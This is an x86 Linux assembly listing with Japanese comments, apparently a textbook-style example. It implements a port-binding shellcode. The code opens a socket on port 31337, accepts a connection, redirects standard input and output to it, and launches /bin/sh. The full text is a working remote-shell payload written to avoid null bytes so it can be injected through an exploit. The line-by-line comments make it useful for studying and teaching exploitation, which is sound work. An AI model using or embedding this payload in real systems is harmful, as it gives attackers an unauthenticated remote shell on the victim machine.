BITS 32

; s = socket(2, 1, 0)
  push BYTE 0x66    ; socketcallはシステムコール102番（0x66）
  pop eax
  cdq               ; DWORDのnullとして使用するためにedxをゼロクリアする
  xor ebx, ebx      ; ebxはsocketcallのタイプ
  inc ebx           ; 1 = SYS_SOCKET = socket() 
  push edx          ; 引数の配列を生成する： { protocol = 0,
  push BYTE 0x1     ;   （逆順）               SOCK_STREAM = 1,
  push BYTE 0x2     ;                          AF_INET = 2 }
  mov ecx, esp      ; ecx = 引数の配列へのポインタ
  int 0x80          ; システムコールの後、eaxにはソケットファイル記述子が格納される

  xchg esi, eax     ; 後で使用するためにソケットファイル記述子をesiに保存する

; bind(s, [2, 31337, 0], 16)
  push BYTE 0x66    ; socketcall （システムコール102番）
  pop eax
  inc ebx           ; ebx = 2 = SYS_BIND = bind()
  push edx          ; sockaddr構造体を生成する：  INADDR_ANY = 0
  push WORD 0x697a  ;   （逆順）                  PORT = 31337
  push WORD bx      ;                             AF_INET = 2
  mov ecx, esp      ; ecx = サーバ構造体へのポインタ
  push BYTE 16      ; argv: { sizeof(server struct) = 16,
  push ecx          ;         server struct pointer,
  push esi          ;         socket file descriptor }
  mov ecx, esp      ; ecx = 引数の配列
  int 0x80          ; eax = 0（成功時）

; listen(s, 0)
  mov BYTE al, 0x66 ; socketcall （システムコール102番）
  inc ebx
  inc ebx           ; ebx = 4 = SYS_LISTEN = listen()
  push ebx          ; argv: { backlog = 4,
  push esi          ;         socket fd }
  mov ecx, esp      ; ecx = 引数の配列
  int 0x80

; c = accept(s, 0, 0)
  mov BYTE al, 0x66 ; socketcall （システムコール102番）
  inc ebx           ; ebx = 5 = SYS_ACCEPT = accept()
  push edx          ; argv: { socklen = 0,
  push edx          ;         sockaddr ptr = NULL,
  push esi          ;         socket fd }
  mov ecx, esp      ; ecx = 引数の配列
  int 0x80          ; eax = 接続されたソケットファイル記述子

; dup2(connected socket, ｛標準入出力ファイル記述子すべて｝)
  xchg eax, ebx     ; ソケットファイル記述子をebxに、0x00000005をeaxに設定する
  push BYTE 0x2     ; ecxは2から開始する
  pop ecx
dup_loop:
  mov BYTE al, 0x3F ; dup2はシステムコール63番
  int 0x80          ; dup2(c, 0)
  dec ecx           ; 0に向かってカウントダウンを行う
  jns dup_loop      ; サインフラグがセットされていない、すなわちecxが負ではない場合

; execve(const char *filename, char *const argv [], char *const envp[])
  mov BYTE al, 11   ; execveはシステムコール11番
  push edx          ; 文字列を終端させるためにnullバイト（複数）をプッシュする
  push 0x68732f2f   ; "//sh"をスタックにプッシュする
  push 0x6e69622f   ; "/bin"をスタックにプッシュする
  mov ebx, esp      ; "/bin//sh"のアドレスをesp経由でebxに格納する
  push edx          ; スタックに32ビットのnull終端をプッシュする
  mov edx, esp      ; これはenvp用の空の配列である
  push ebx          ; null終端の上にある文字列のアドレスをスタックにプッシュする
  mov ecx, esp      ; これは文字列ポインタを用いたargv用の配列である
  int 0x80          ; execve("/bin//sh", ["/bin//sh", NULL], [NULL])
